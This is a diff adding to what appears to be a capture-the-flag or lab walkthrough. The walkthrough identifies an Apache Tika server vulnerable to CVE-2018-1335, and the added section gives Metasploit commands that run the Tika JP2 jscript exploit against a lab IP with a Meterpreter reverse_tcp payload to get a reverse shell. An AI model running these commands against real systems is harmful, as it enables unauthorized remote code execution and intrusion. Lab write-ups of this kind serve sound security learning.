@@ -109,3 +109,16 @@ Accessing this gives you a Apache 1.7 Tika server! Boom. Now let's see if there 
 
 One google search and we have [RCE (CVE-2018–1335)](https://rhinosecuritylabs.com/application-security/exploiting-cve-2018-1335-apache-tika/)  
 and https://www.exploit-db.com/exploits/47208. Now we use the `metasploit` module. It has a module for this CVE so that's convenient!
+```bash
+msfconsole
+use exploit/windows/http/apache_tika_jp2_jscript
+set RHOSTS 10.201.76.93
+set RPORT 61777
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST <your_kali_ip>
+set LPORT <your_listener_port>
+exploit
+```
+Run this and you'll have the reverse shell! Nice!
+![[Pasted image 20250731203344.png]]
+
